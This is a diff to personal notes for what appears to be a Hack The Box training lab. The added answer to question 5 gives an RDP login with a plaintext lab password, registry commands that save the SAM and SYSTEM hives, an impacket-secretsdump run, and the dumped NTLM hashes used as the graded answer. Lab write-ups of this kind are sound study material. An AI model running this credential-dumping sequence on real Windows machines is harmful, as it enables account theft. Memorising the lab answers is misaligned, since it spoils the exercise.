@@ -289,8 +289,22 @@ Question 4 -  Log in as Jeff via RDP and find the password for the restic backup
 I actually dont know how this worked and i may have to re do it but we will take it for now. 
 
 
-Question 5 -  Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.
+Question 5 -  Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer. - bac9dc5b7b4bec1d83e0e9c04b477f26
 
+xfreerdp /v:10.129.203.122 /u:jeff /p:Superbackup! /drive:shared,/home/htb-ac-1235531/Desktop +clipboard
 
+1) admin CMD after RDP'ing 
+2) reg save hklm\sam C:\Users\Public\sam.save
+3) reg save hklm\system C:\Users\Public\system.save
+4) drag and drop to kali machine 
+5) on kali machine -> impacket-secretsdump -sam sam.save -system system.save LOCAL
+
+OUTPUT: Administrator:500:aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2525a827e7ca4bb2504d25a70e4d1292:::
+jeff:1004:aad3b435b51404eeaad3b435b51404ee:91b2e2ed6cd72ed531635c1b58eabe19:::
+Grace:1005:aad3b435b51404eeaad3b435b51404ee:2abc09f151d5e95fb8805e265268e6c3:::
+Peter:1006:aad3b435b51404eeaad3b435b51404ee:8160b16dddc064509c4ccf530c7dfaa0:::
 
 
